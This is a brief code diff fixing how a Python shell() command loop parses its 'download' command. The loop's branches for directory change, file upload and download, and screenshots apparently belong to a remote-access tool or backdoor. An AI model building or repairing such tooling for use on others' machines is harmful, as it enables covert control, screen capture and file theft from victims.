@@ -57,7 +57,7 @@ def shell():
             os.chdir(command[3:])
         elif command[:6] == 'upload':
             download_file(command[7:])
-        elif command[5:] == 'dload':
+        elif command[:8] == 'download':
             upload_file(command[9:])
         elif command[:10] == 'screenshot':
             screenshot()
